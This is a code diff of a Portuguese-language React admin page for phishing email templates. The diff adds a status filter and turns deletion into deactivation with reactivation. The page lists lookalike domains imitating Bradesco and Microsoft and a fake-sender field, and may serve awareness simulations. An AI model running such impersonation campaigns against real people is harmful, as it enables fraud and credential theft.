@@ -31,7 +31,6 @@ const DOMAINS = [
   { id: 2, name: "rh.acesso-seguro.top" },
   { id: 3, name: "bradesco.acesso-seguro.top" },
   { id: 4, name: "consorcio.acesso-seguro.top" },
-  { id: 5, name: "microsoft.acesso-seguro.top" },
 ];
 
 export default function ModelsPage() {
@@ -52,11 +51,12 @@ export default function ModelsPage() {
   const [filterDominio, setFilterDominio] = useState("");
   const [filterDataInicio, setFilterDataInicio] = useState("");
   const [filterDataFim, setFilterDataFim] = useState("");
+  const [filterStatus, setFilterStatus] = useState("ativos");
 
-  const filterActive = !!(filterNome || filterDominio || filterDataInicio || filterDataFim);
-  const activeCount = [filterNome, filterDominio, filterDataInicio, filterDataFim].filter(Boolean).length;
+  const filterActive = !!(filterNome || filterDominio || filterDataInicio || filterDataFim || filterStatus !== "ativos");
+  const activeCount = [filterNome, filterDominio, filterDataInicio, filterDataFim, filterStatus !== "ativos" ? "1" : ""].filter(Boolean).length;
   const clearFilters = () => {
-    setFilterNome(""); setFilterDominio(""); setFilterDataInicio(""); setFilterDataFim("");
+    setFilterNome(""); setFilterDominio(""); setFilterDataInicio(""); setFilterDataFim(""); setFilterStatus("ativos");
   };
 
   const uniqueDomains = useMemo(
@@ -68,6 +68,8 @@ export default function ModelsPage() {
     return models.filter((m) => {
       if (filterNome && !m.nomeModelo.toLowerCase().includes(filterNome.toLowerCase())) return false;
       if (filterDominio && m.dominioAlvo !== filterDominio) return false;
+      if (filterStatus === "ativos" && m.isAtivo === false) return false;
+      if (filterStatus === "inativos" && m.isAtivo !== false) return false;
       if (m.data) {
         const d = new Date(m.data);
         if (filterDataInicio) {
@@ -83,7 +85,7 @@ export default function ModelsPage() {
       }
       return true;
     });
-  }, [models, filterNome, filterDominio, filterDataInicio, filterDataFim]);
+  }, [models, filterNome, filterDominio, filterDataInicio, filterDataFim, filterStatus]);
 
   // ─────────────────────────────────────────────────────────────────────────
 
@@ -158,10 +160,20 @@ export default function ModelsPage() {
     setDeleteModal({ open: false, id: null });
     try {
       await api.delete(`/api/modelos/${id}`);
-      setModels((prev) => prev.filter((m) => m.idModelo !== id));
-      showModal("Modelo excluído", "O modelo foi removido com sucesso.", "success");
+      setModels((prev) => prev.map((m) => m.idModelo === id ? { ...m, isAtivo: false } : m));
+      showModal("Modelo desativado", "O modelo foi desativado com sucesso.", "success");
     } catch {
       showModal("Erro ao excluir", "Não foi possível excluir o modelo. Tente novamente.", "error");
+    }
+  };
+
+  const handleReativar = async (id) => {
+    try {
+      await api.put(`/api/modelos/${id}/reativar`);
+      setModels((prev) => prev.map((m) => m.idModelo === id ? { ...m, isAtivo: true } : m));
+      showModal("Modelo reativado", "O modelo foi reativado com sucesso.", "success");
+    } catch {
+      showModal("Erro ao reativar", "Não foi possível reativar o modelo. Tente novamente.", "error");
     }
   };
 
@@ -220,6 +232,21 @@ export default function ModelsPage() {
             </SelectContent>
           </Select>
         </Field>
+        <Field className="w-40 shrink-0">
+          <FieldLabel className="text-xs text-slate-500">Status</FieldLabel>
+          <Select value={filterStatus} onValueChange={setFilterStatus}>
+            <SelectTrigger className="h-9 w-full text-sm">
+              <SelectValue placeholder="Status">
+                {filterStatus === "todos" ? "Todos" : filterStatus === "ativos" ? "Ativos" : "Inativos"}
+              </SelectValue>
+            </SelectTrigger>
+            <SelectContent>
+              <SelectItem value="todos">Todos</SelectItem>
+              <SelectItem value="ativos">Ativos</SelectItem>
+              <SelectItem value="inativos">Inativos</SelectItem>
+            </SelectContent>
+          </Select>
+        </Field>
         <Field className="w-auto shrink-0">
           <FieldLabel className="text-xs text-slate-500">Data inicial</FieldLabel>
           <Input
@@ -264,8 +291,11 @@ export default function ModelsPage() {
               </thead>
               <tbody className="divide-y divide-slate-100">
                 {filteredModels.map((model) => (
-                  <tr key={model.idModelo} className="hover:bg-slate-50 transition-colors">
-                    <td className="px-6 py-4 font-medium text-slate-900">{model.nomeModelo}</td>
+                  <tr key={model.idModelo} className={`transition-colors ${model.isAtivo === false ? 'bg-slate-100 opacity-60 grayscale' : 'hover:bg-slate-50'}`}>
+                    <td className="px-6 py-4 font-medium text-slate-900">
+                      {model.nomeModelo}
+                      {model.isAtivo === false && <span className="ml-2 text-[10px] uppercase font-bold bg-slate-200 text-slate-500 px-1.5 py-0.5 rounded">Inativo</span>}
+                    </td>
                     <td className="px-6 py-4 text-slate-600">{model.dominioAlvo}</td>
                     <td className="px-6 py-4 text-slate-500">{model.remetenteFalso}</td>
                     <td className="px-6 py-4 text-slate-400 text-xs">
@@ -273,12 +303,20 @@ export default function ModelsPage() {
                     </td>
                     <td className="px-6 py-4 text-right">
                       <div className="flex justify-end gap-2">
-                        <Button variant="outline" size="sm" onClick={() => openEditMode(model)} className="text-blue-600 border-blue-200 hover:bg-blue-50">
-                          <PencilIcon className="size-4 mr-1" /> Editar
-                        </Button>
-                        <Button variant="outline" size="sm" onClick={() => handleDelete(model.idModelo)} className="text-red-600 border-red-200 hover:bg-red-50">
-                          <TrashIcon className="size-4" />
-                        </Button>
+                        {model.isAtivo !== false && (
+                          <Button variant="outline" size="sm" onClick={() => openEditMode(model)} className="text-blue-600 border-blue-200 hover:bg-blue-50">
+                            <PencilIcon className="size-4 mr-1" /> Editar
+                          </Button>
+                        )}
+                        {model.isAtivo !== false ? (
+                          <Button variant="outline" size="sm" onClick={() => handleDelete(model.idModelo)} className="text-red-600 border-red-200 hover:bg-red-50" title="Desativar modelo">
+                            <TrashIcon className="size-4" />
+                          </Button>
+                        ) : (
+                          <Button variant="outline" size="sm" onClick={() => handleReativar(model.idModelo)} className="text-emerald-600 border-emerald-200 hover:bg-emerald-50" title="Reativar modelo">
+                            <CheckIcon className="size-4" />
+                          </Button>
+                        )}
                       </div>
                     </td>
                   </tr>
@@ -383,11 +421,11 @@ export default function ModelsPage() {
       <Modal
         open={deleteModal.open}
         onClose={() => setDeleteModal({ open: false, id: null })}
-        title="Excluir modelo"
-        description="Tem certeza que deseja excluir este modelo? Essa ação não pode ser desfeita."
+        title="Desativar modelo"
+        description="Tem certeza que deseja desativar este modelo? Ele não aparecerá mais para novos envios."
         variant="warning"
         confirm
-        confirmLabel="Sim, excluir"
+        confirmLabel="Sim, desativar"
         onConfirm={confirmDelete}
       />
       {isFormOpen ? renderForm() : renderTable()}
